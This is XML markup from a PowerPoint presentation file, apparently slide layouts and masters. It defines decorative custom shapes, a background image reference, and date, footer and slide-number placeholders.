        <p:cNvGrpSpPr/>
        <p:nvPr/>
      </p:nvGrpSpPr>
      <p:grpSpPr>
        <a:xfrm>
          <a:off x="0" y="0"/>
          <a:ext cx="0" cy="0"/>
          <a:chOff x="0" y="0"/>
          <a:chExt cx="0" cy="0"/>
        </a:xfrm>
      </p:grpSpPr>
      <p:pic>
        <p:nvPicPr>
          <p:cNvPr id="134" name="Google Shape;134;p22"/>
          <p:cNvPicPr preferRelativeResize="0"/>
          <p:nvPr/>
        </p:nvPicPr>
        <p:blipFill>
          <a:blip r:embed="rId2">
            <a:alphaModFix/>
          </a:blip>
          <a:stretch>
            <a:fillRect/>
          </a:stretch>
        </p:blipFill>
        <p:spPr>
          <a:xfrm>
            <a:off x="0" y="-43885"/>
            <a:ext cx="9143998" cy="5231259"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln>
            <a:noFill/>
          </a:ln>
        </p:spPr>
      </p:pic>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="135" name="Google Shape;135;p22"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm flipH="1">
            <a:off x="5151255" y="3819000"/>
            <a:ext cx="4144196" cy="1743872"/>
          </a:xfrm>
          <a:custGeom>
            <a:avLst/>
            <a:gdLst/>
            <a:ahLst/>
            <a:cxnLst/>
            <a:rect l="l" t="t" r="r" b="b"/>
            <a:pathLst>
              <a:path w="67985" h="28608" extrusionOk="0">
                <a:moveTo>
                  <a:pt x="2624" y="0"/>
                </a:moveTo>
                <a:cubicBezTo>
                  <a:pt x="1714" y="0"/>
                  <a:pt x="825" y="213"/>
                  <a:pt x="1" y="709"/>
                </a:cubicBezTo>
                <a:lnTo>
                  <a:pt x="1225" y="25635"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="66491" y="28607"/>
                </a:lnTo>
                <a:cubicBezTo>
                  <a:pt x="67984" y="20617"/>
                  <a:pt x="61488" y="12074"/>
                  <a:pt x="53408" y="11372"/>
                </a:cubicBezTo>
                <a:cubicBezTo>
                  <a:pt x="52914" y="11328"/>
                  <a:pt x="52417" y="11309"/>
                  <a:pt x="51918" y="11309"/>
                </a:cubicBezTo>
                <a:cubicBezTo>
                  <a:pt x="48698" y="11309"/>
                  <a:pt x="45399" y="12100"/>
                  <a:pt x="42248" y="12100"/>
                </a:cubicBezTo>
                <a:cubicBezTo>
                  <a:pt x="40562" y="12100"/>
                  <a:pt x="38919" y="11873"/>
                  <a:pt x="37353" y="11178"/>
                </a:cubicBezTo>
                <a:cubicBezTo>
                  <a:pt x="34471" y="9894"/>
                  <a:pt x="32230" y="7116"/>
                  <a:pt x="29094" y="6668"/>
                </a:cubicBezTo>
                <a:cubicBezTo>
                  <a:pt x="28787" y="6623"/>
                  <a:pt x="28481" y="6603"/>
                  <a:pt x="28177" y="6603"/>
                </a:cubicBezTo>
                <a:cubicBezTo>
                  <a:pt x="25030" y="6603"/>
                  <a:pt x="22014" y="8758"/>
                  <a:pt x="18830" y="8758"/>
                </a:cubicBezTo>
                <a:cubicBezTo>
                  <a:pt x="18682" y="8758"/>
                  <a:pt x="18534" y="8753"/>
                  <a:pt x="18386" y="8744"/>
                </a:cubicBezTo>
                <a:cubicBezTo>
                  <a:pt x="14846" y="8520"/>
                  <a:pt x="12217" y="5592"/>
                  <a:pt x="9574" y="3233"/>
                </a:cubicBezTo>
                <a:cubicBezTo>
                  <a:pt x="7649" y="1525"/>
                  <a:pt x="5060" y="0"/>
                  <a:pt x="2624" y="0"/>
                </a:cubicBezTo>
                <a:close/>
              </a:path>
            </a:pathLst>
          </a:custGeom>
          <a:solidFill>
            <a:srgbClr val="D6E6EB">
              <a:alpha val="525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6" name="Google Shape;136;p22"/>
          <p:cNvGrpSpPr/>
          <p:nvPr/>
        </p:nvGrpSpPr>
        <p:grpSpPr>
          <a:xfrm>
            <a:off x="-291571" y="297125"/>
            <a:ext cx="9216725" cy="5076680"/>
            <a:chOff x="-291571" y="297125"/>
            <a:chExt cx="9216725" cy="5076680"/>
          </a:xfrm>
        </p:grpSpPr>
        <p:sp>
          <p:nvSpPr>
            <p:cNvPr id="137" name="Google Shape;137;p22"/>
            <p:cNvSpPr/>
            <p:nvPr/>
          </p:nvSpPr>
          <p:spPr>
            <a:xfrm rot="-10558294" flipH="1">
              <a:off x="-240965" y="3775604"/>
              <a:ext cx="2267198" cy="1520441"/>
            </a:xfrm>
            <a:custGeom>
              <a:avLst/>
              <a:gdLst/>
              <a:ahLst/>
              <a:cxnLst/>
              <a:rect l="l" t="t" r="r" b="b"/>
              <a:pathLst>
                <a:path w="62892" h="42177" fill="none" extrusionOk="0">
                  <a:moveTo>
                    <a:pt x="1" y="42176"/>
                  </a:moveTo>
                  <a:cubicBezTo>
                    <a:pt x="1838" y="37352"/>
                    <a:pt x="3675" y="32513"/>
                    <a:pt x="6273" y="28078"/>
                  </a:cubicBezTo>
                  <a:cubicBezTo>
                    <a:pt x="8887" y="23627"/>
                    <a:pt x="12337" y="19565"/>
                    <a:pt x="16773" y="16966"/>
                  </a:cubicBezTo>
                  <a:cubicBezTo>
                    <a:pt x="19401" y="15413"/>
                    <a:pt x="23000" y="14487"/>
                    <a:pt x="25345" y="16443"/>
                  </a:cubicBezTo>
                  <a:cubicBezTo>
                    <a:pt x="27571" y="18295"/>
                    <a:pt x="27451" y="21925"/>
                    <a:pt x="25928" y="24389"/>
                  </a:cubicBezTo>
                  <a:cubicBezTo>
                    <a:pt x="24584" y="26554"/>
                    <a:pt x="21522" y="28137"/>
                    <a:pt x="19536" y="26539"/>
                  </a:cubicBezTo>
                  <a:cubicBezTo>
                    <a:pt x="17594" y="24956"/>
                    <a:pt x="18430" y="21686"/>
                    <a:pt x="20208" y="19923"/>
                  </a:cubicBezTo>
                  <a:cubicBezTo>
                    <a:pt x="22836" y="17295"/>
                    <a:pt x="26824" y="16518"/>
                    <a:pt x="30543" y="16533"/>
                  </a:cubicBezTo>
                  <a:cubicBezTo>
                    <a:pt x="34276" y="16563"/>
                    <a:pt x="37980" y="17265"/>
                    <a:pt x="41699" y="17071"/>
                  </a:cubicBezTo>
                  <a:cubicBezTo>
                    <a:pt x="51377" y="16563"/>
                    <a:pt x="60338" y="9349"/>
                    <a:pt x="62892" y="0"/>
                  </a:cubicBezTo>
                </a:path>
              </a:pathLst>
            </a:custGeom>
            <a:noFill/>
            <a:ln w="19050" cap="rnd"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2"/>
            <p:cNvSpPr/>
            <p:nvPr/>
          </p:nvSpPr>
          <p:spPr>
            <a:xfrm rot="10800000" flipH="1">
              <a:off x="5003800" y="4879974"/>
              <a:ext cx="664502" cy="66826"/>
            </a:xfrm>
            <a:custGeom>
              <a:avLst/>
              <a:gdLst/>
              <a:ahLst/>
              <a:cxnLst/>
              <a:rect l="l" t="t" r="r" b="b"/>
              <a:pathLst>
                <a:path w="7289" h="733" fill="none" extrusionOk="0">
                  <a:moveTo>
                    <a:pt x="0" y="1"/>
                  </a:moveTo>
                  <a:cubicBezTo>
                    <a:pt x="732" y="1"/>
                    <a:pt x="732" y="733"/>
                    <a:pt x="1464" y="733"/>
                  </a:cubicBezTo>
                  <a:cubicBezTo>
                    <a:pt x="2196" y="733"/>
                    <a:pt x="2196" y="1"/>
                    <a:pt x="2913" y="1"/>
                  </a:cubicBezTo>
                  <a:cubicBezTo>
                    <a:pt x="3644" y="1"/>
                    <a:pt x="3644" y="733"/>
                    <a:pt x="4376" y="733"/>
                  </a:cubicBezTo>
                  <a:cubicBezTo>
                    <a:pt x="5108" y="733"/>
                    <a:pt x="5108" y="1"/>
                    <a:pt x="5840" y="1"/>
                  </a:cubicBezTo>
                  <a:cubicBezTo>
                    <a:pt x="6557" y="1"/>
                    <a:pt x="6572" y="733"/>
                    <a:pt x="7289" y="733"/>
                  </a:cubicBez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2"/>
            <p:cNvSpPr/>
            <p:nvPr/>
          </p:nvSpPr>
          <p:spPr>
            <a:xfrm>
              <a:off x="8696900" y="4329950"/>
              <a:ext cx="228254" cy="228296"/>
            </a:xfrm>
            <a:custGeom>
              <a:avLst/>
              <a:gdLst/>
              <a:ahLst/>
              <a:cxnLst/>
              <a:rect l="l" t="t" r="r" b="b"/>
              <a:pathLst>
                <a:path w="3719" h="3720" fill="none" extrusionOk="0">
                  <a:moveTo>
                    <a:pt x="0" y="1867"/>
                  </a:moveTo>
                  <a:cubicBezTo>
                    <a:pt x="1195" y="2226"/>
                    <a:pt x="1494" y="2509"/>
                    <a:pt x="1852" y="3719"/>
                  </a:cubicBezTo>
                  <a:cubicBezTo>
                    <a:pt x="2211" y="2509"/>
                    <a:pt x="2509" y="2226"/>
                    <a:pt x="3719" y="1867"/>
                  </a:cubicBezTo>
                  <a:cubicBezTo>
                    <a:pt x="2509" y="1494"/>
                    <a:pt x="2211" y="1210"/>
                    <a:pt x="1852" y="0"/>
                  </a:cubicBezTo>
                  <a:cubicBezTo>
                    <a:pt x="1494" y="1210"/>
                    <a:pt x="1195" y="1494"/>
                    <a:pt x="0" y="1867"/>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2"/>
            <p:cNvSpPr/>
            <p:nvPr/>
          </p:nvSpPr>
          <p:spPr>
            <a:xfrm>
              <a:off x="8737075" y="297125"/>
              <a:ext cx="147900" cy="1479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41"/>
        <p:cNvGrpSpPr/>
        <p:nvPr/>
      </p:nvGrpSpPr>
      <p:grpSpPr>
        <a:xfrm>
          <a:off x="0" y="0"/>
          <a:ext cx="0" cy="0"/>
          <a:chOff x="0" y="0"/>
          <a:chExt cx="0" cy="0"/>
        </a:xfrm>
      </p:grpSpPr>
      <p:pic>
        <p:nvPicPr>
          <p:cNvPr id="142" name="Google Shape;142;p23"/>
          <p:cNvPicPr preferRelativeResize="0"/>
          <p:nvPr/>
        </p:nvPicPr>
        <p:blipFill>
          <a:blip r:embed="rId2">
            <a:alphaModFix/>
          </a:blip>
          <a:stretch>
            <a:fillRect/>
          </a:stretch>
        </p:blipFill>
        <p:spPr>
          <a:xfrm>
            <a:off x="0" y="-43885"/>
            <a:ext cx="9143998" cy="5231259"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln>
            <a:noFill/>
          </a:ln>
        </p:spPr>
      </p:pic>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="143" name="Google Shape;143;p23"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="-396402" y="-536388"/>
            <a:ext cx="4144196" cy="1743445"/>
          </a:xfrm>
          <a:custGeom>
            <a:avLst/>
            <a:gdLst/>
            <a:ahLst/>
            <a:cxnLst/>
            <a:rect l="l" t="t" r="r" b="b"/>
            <a:pathLst>
              <a:path w="67985" h="28601" extrusionOk="0">
                <a:moveTo>
                  <a:pt x="66491" y="0"/>
                </a:moveTo>
                <a:lnTo>
                  <a:pt x="1210" y="2958"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="1" y="27884"/>
                </a:lnTo>
                <a:cubicBezTo>
                  <a:pt x="829" y="28386"/>
                  <a:pt x="1721" y="28601"/>
                  <a:pt x="2635" y="28601"/>
                </a:cubicBezTo>
                <a:cubicBezTo>
                  <a:pt x="5068" y="28601"/>
                  <a:pt x="7652" y="27075"/>
                  <a:pt x="9574" y="25360"/>
                </a:cubicBezTo>
                <a:cubicBezTo>
                  <a:pt x="12217" y="23015"/>
                  <a:pt x="14846" y="20073"/>
                  <a:pt x="18386" y="19849"/>
                </a:cubicBezTo>
                <a:cubicBezTo>
                  <a:pt x="18525" y="19840"/>
                  <a:pt x="18664" y="19836"/>
                  <a:pt x="18803" y="19836"/>
                </a:cubicBezTo>
                <a:cubicBezTo>
                  <a:pt x="21997" y="19836"/>
                  <a:pt x="25021" y="22004"/>
                  <a:pt x="28177" y="22004"/>
                </a:cubicBezTo>
                <a:cubicBezTo>
                  <a:pt x="28481" y="22004"/>
                  <a:pt x="28787" y="21984"/>
                  <a:pt x="29094" y="21940"/>
                </a:cubicBezTo>
                <a:cubicBezTo>
                  <a:pt x="32230" y="21492"/>
                  <a:pt x="34470" y="18714"/>
                  <a:pt x="37353" y="17429"/>
                </a:cubicBezTo>
                <a:cubicBezTo>
                  <a:pt x="38924" y="16732"/>
                  <a:pt x="40573" y="16505"/>
                  <a:pt x="42266" y="16505"/>
                </a:cubicBezTo>
                <a:cubicBezTo>
                  <a:pt x="45422" y="16505"/>
                  <a:pt x="48729" y="17295"/>
                  <a:pt x="51954" y="17295"/>
                </a:cubicBezTo>
                <a:cubicBezTo>
                  <a:pt x="52441" y="17295"/>
                  <a:pt x="52926" y="17277"/>
                  <a:pt x="53408" y="17235"/>
                </a:cubicBezTo>
                <a:cubicBezTo>
                  <a:pt x="61488" y="16518"/>
                  <a:pt x="67984" y="7991"/>
                  <a:pt x="66491" y="0"/>
                </a:cubicBezTo>
                <a:close/>
              </a:path>
            </a:pathLst>
          </a:custGeom>
          <a:solidFill>
            <a:srgbClr val="D6E6EB">
              <a:alpha val="525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3"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm rot="-4877097" flipH="1">
            <a:off x="7246776" y="3715561"/>
            <a:ext cx="2267335" cy="1520533"/>
          </a:xfrm>
          <a:custGeom>
            <a:avLst/>
            <a:gdLst/>
            <a:ahLst/>
            <a:cxnLst/>
            <a:rect l="l" t="t" r="r" b="b"/>
            <a:pathLst>
              <a:path w="62892" h="42177" fill="none" extrusionOk="0">
                <a:moveTo>
                  <a:pt x="1" y="42176"/>
                </a:moveTo>
                <a:cubicBezTo>
                  <a:pt x="1838" y="37352"/>
                  <a:pt x="3675" y="32513"/>
                  <a:pt x="6273" y="28078"/>
                </a:cubicBezTo>
                <a:cubicBezTo>
                  <a:pt x="8887" y="23627"/>
                  <a:pt x="12337" y="19565"/>
                  <a:pt x="16773" y="16966"/>
                </a:cubicBezTo>
                <a:cubicBezTo>
                  <a:pt x="19401" y="15413"/>
                  <a:pt x="23000" y="14487"/>
                  <a:pt x="25345" y="16443"/>
                </a:cubicBezTo>
                <a:cubicBezTo>
                  <a:pt x="27571" y="18295"/>
                  <a:pt x="27451" y="21925"/>
                  <a:pt x="25928" y="24389"/>
                </a:cubicBezTo>
                <a:cubicBezTo>
                  <a:pt x="24584" y="26554"/>
                  <a:pt x="21522" y="28137"/>
                  <a:pt x="19536" y="26539"/>
                </a:cubicBezTo>
                <a:cubicBezTo>
                  <a:pt x="17594" y="24956"/>
                  <a:pt x="18430" y="21686"/>
                  <a:pt x="20208" y="19923"/>
                </a:cubicBezTo>
                <a:cubicBezTo>
                  <a:pt x="22836" y="17295"/>
                  <a:pt x="26824" y="16518"/>
                  <a:pt x="30543" y="16533"/>
                </a:cubicBezTo>
                <a:cubicBezTo>
                  <a:pt x="34276" y="16563"/>
                  <a:pt x="37980" y="17265"/>
                  <a:pt x="41699" y="17071"/>
                </a:cubicBezTo>
                <a:cubicBezTo>
                  <a:pt x="51377" y="16563"/>
                  <a:pt x="60338" y="9349"/>
                  <a:pt x="62892" y="0"/>
                </a:cubicBezTo>
              </a:path>
            </a:pathLst>
          </a:custGeom>
          <a:noFill/>
          <a:ln w="19050" cap="rnd"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D0BD552-508A-47D1-9546-B8AF3D887579}" type="datetimeFigureOut">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50EE5F-0027-4A6D-B4BE-ED9346D1634D}" type="slidenum">
              <a:rPr lang="en-US" smtClean="0"/>
              <a:pPr/>
              <a:t>‹#›</a:t>
            </a:fld>
            <a:endParaRPr lang="en-US"/>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="2134389832"/>
      </p:ext>
    </p:extLst>
  </p:cSld>
  <p:clrMapOvr>
    <a:masterClrMapping/>
  </p:clrMapOvr>
  <p:transition spd="slow">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4F4C0-79E0-B378-5297-C522869D6E0F}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>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DC55820-9044-6470-E21F-B7A609EF3C52}"/>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D5CBF79-A5FF-CF40-F136-7B72724A3B93}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="dt" sz="half" idx="10"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:fld id="{7349D043-CE0A-48CD-BD0F-6ED85978C583}" type="datetimeFigureOut">
              <a:rPr lang="en-IN" smtClean="0"/>
              <a:t>24-09-2025</a:t>
            </a:fld>
            <a:endParaRPr lang="en-IN"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="5" name="Footer Placeholder 4">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{A031087D-70E6-1E4E-C06A-9D18C686B4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DC6BEE-003B-D120-96E4-987012001B1C}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="sldNum" sz="quarter" idx="12"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:fld id="{50DB7CFE-38F4-4ED1-AE97-18C51BBA904B}" type="slidenum">
              <a:rPr lang="en-IN" smtClean="0"/>
              <a:t>‹#›</a:t>
            </a:fld>
            <a:endParaRPr lang="en-IN"/>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="3983699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DA473-9046-D367-642A-8713B9051C8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1F5DC57-B060-D46A-641D-2426924C07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D20C9D-F41F-CA7B-E26C-1926B39D3D39}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="dt" sz="half" idx="10"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:fld id="{7349D043-CE0A-48CD-BD0F-6ED85978C583}" type="datetimeFigureOut">
              <a:rPr lang="en-IN" smtClean="0"/>
              <a:t>24-09-2025</a:t>
            </a:fld>
            <a:endParaRPr lang="en-IN"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="5" name="Footer Placeholder 4">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{83B8F5E8-BBA8-E0BC-71BD-6C8705BD67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F8C73D-5A47-244E-E74D-05C8001F540E}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="sldNum" sz="quarter" idx="12"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:fld id="{50DB7CFE-38F4-4ED1-AE97-18C51BBA904B}" type="slidenum">
              <a:rPr lang="en-IN" smtClean="0"/>
              <a:t>‹#›</a:t>
            </a:fld>
            <a:endParaRPr lang="en-IN"/>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="41117044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750F1-5DC4-686C-1C5C-B1EA0D22A068}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="title"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="623888" y="1282700"/>
            <a:ext cx="7886700" cy="2139950"/>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946DA15-BC20-E5C9-3BCE-C26ACC02768A}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>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5EF67D-CDB6-A4A6-AF71-466AB42DA4F0}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="dt" sz="half" idx="10"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:fld id="{7349D043-CE0A-48CD-BD0F-6ED85978C583}" type="datetimeFigureOut">
              <a:rPr lang="en-IN" smtClean="0"/>
              <a:t>24-09-2025</a:t>
            </a:fld>
            <a:endParaRPr lang="en-IN"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="5" name="Footer Placeholder 4">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{CC8F0D9C-5BCF-7415-F9F3-FE558C1895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DEF9D2-3B82-117F-9210-B163194EA405}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="sldNum" sz="quarter" idx="12"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:fld id="{50DB7CFE-38F4-4ED1-AE97-18C51BBA904B}" type="slidenum">
              <a:rPr lang="en-IN" smtClean="0"/>
              <a:t>‹#›</a:t>
            </a:fld>
            <a:endParaRPr lang="en-IN"/>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="38542051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B0DD3-0FD3-36F5-BAC6-668F60A3921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377D05-0240-37EC-22C6-52A11DC75054}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph sz="half" idx="1"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="62865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D75984A-85C8-5157-BBB4-C6DE67AADCDE}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph sz="half" idx="2"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="464820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5BBFF6C-74F3-D817-7454-856BB256B4AF}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="dt" sz="half" idx="10"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:fld id="{7349D043-CE0A-48CD-BD0F-6ED85978C583}" type="datetimeFigureOut">
              <a:rPr lang="en-IN" smtClean="0"/>
              <a:t>24-09-2025</a:t>
            </a:fld>
            <a:endParaRPr lang="en-IN"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="6" name="Footer Placeholder 5">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{8EC55987-7F96-25A0-B555-CBE57746CA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C30228C-E0EE-F2C1-89CA-6BF860FD05E6}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="sldNum" sz="quarter" idx="12"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:fld id="{50DB7CFE-38F4-4ED1-AE97-18C51BBA904B}" type="slidenum">
              <a:rPr lang="en-IN" smtClean="0"/>
              <a:t>‹#›</a:t>
            </a:fld>
            <a:endParaRPr lang="en-IN"/>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="9029881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4B4B1-7944-8430-637C-F79C65554559}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="title"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="630238" y="274638"/>
            <a:ext cx="7886700" cy="993775"/>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1C4AB33-5386-D07D-41E6-3D3B0F837C92}"/>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F84D9A-776D-BE60-38F9-FEB1FE33395D}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph sz="half" idx="2"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="630238" y="1879600"/>
            <a:ext cx="3868737"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9319CB4-FA1B-D772-C46C-F9376189CF38}"/>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8C857E-361A-B768-16EE-50A862E0056B}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph sz="quarter" idx="4"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="4629150" y="1879600"/>
            <a:ext cx="3887788"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7A9FAD0-8580-E18C-7599-055C8F12F179}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="dt" sz="half" idx="10"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:fld id="{7349D043-CE0A-48CD-BD0F-6ED85978C583}" type="datetimeFigureOut">
              <a:rPr lang="en-IN" smtClean="0"/>
              <a:t>24-09-2025</a:t>
            </a:fld>
            <a:endParaRPr lang="en-IN"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="8" name="Footer Placeholder 7">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{558A3D35-62C2-602D-1069-CDA15D607A9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B4A403C-E69C-660A-3137-25AD0C2AFB5E}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="sldNum" sz="quarter" idx="12"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:fld id="{50DB7CFE-38F4-4ED1-AE97-18C51BBA904B}" type="slidenum">
              <a:rPr lang="en-IN" smtClean="0"/>
              <a:t>‹#›</a:t>
            </a:fld>
            <a:endParaRPr lang="en-IN"/>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="13624743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51835-B460-A031-4F7C-089A600F1F8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DEC1DCC-9A21-800B-5A8C-0A5E501D0562}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="dt" sz="half" idx="10"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:fld id="{7349D043-CE0A-48CD-BD0F-6ED85978C583}" type="datetimeFigureOut">
              <a:rPr lang="en-IN" smtClean="0"/>
              <a:t>24-09-2025</a:t>
            </a:fld>
            <a:endParaRPr lang="en-IN"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="4" name="Footer Placeholder 3">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
